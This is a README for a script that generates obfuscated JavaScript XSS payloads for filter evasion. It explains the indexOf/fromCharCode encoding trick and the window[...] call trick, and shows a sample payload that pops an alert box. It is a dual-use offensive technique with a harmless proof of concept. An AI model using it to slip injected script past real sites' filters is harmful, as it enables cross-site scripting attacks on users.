# Obfuscated XSS for filter evasion

Playing with JavaScript for fun and XSS evasion.

## Usage

To generate an alert box containing 'XSS':

    python make_s.py alert -p "XSS" -o out.js

Should generate this:

    var f = window[String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())+String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())+String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())+String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())+String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())];
    f(String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())+String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf())+String.fromCharCode('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAundefined'.indexOf()));

To see what happened:

    cat pre out.js post > out.html

Then open ``out.html`` with your browser. You should see an alert box.

## Why

This is valid JavaScript:

    var foo = 'AAAAundefined'.indexOf();
    // 'foo' is now 4
    var chr = String.fromCharCode(97 + foo);
    // 'chr' is now 'e'

So one could encode a string like 'alert("XSS")' using any character repeated N times (with N the ASCII value of the character) followed by the string 'undefined'.

However, writing 'alert' is not enough; we'd like to execute it. To do so without an explicit call to 'eval':

    var f = window['alert'];
    var g = 'the parameter';
    // will alert 'the parameter'
    f(g);

Ultimately:

    1. Take a payload e.g. 'alert("XSS")'
    2. Encode the function call 'alert' and the parameter '"XSS"' using the 'indexOf' trick
    3. Execute the function using the 'window' trick

## MOAR Tricks

When generating the payload, to avoid the call to 'fromCharCode' use this (only for letters, as 36 here is a base):

    (11).toString(36); = 'b'

Also to avoid the 'undefined' string, use an empty function:

    function f() {}
    var foo = 'AAAA' + f();
    var foo2 = foo.indexOf()

## Thanks to

For the inspiration [this post by Neil Fraser][1]. For implementation, [this SO answer][2] and [this post][3].

 [1]: https://neil.fraser.name/news/2016/10/07/ 
 [2]: http://stackoverflow.com/questions/3145030/convert-integer-into-its-character-equivalent-in-javascript
 [3]: http://viralpatel.net/blogs/calling-javascript-function-from-string/
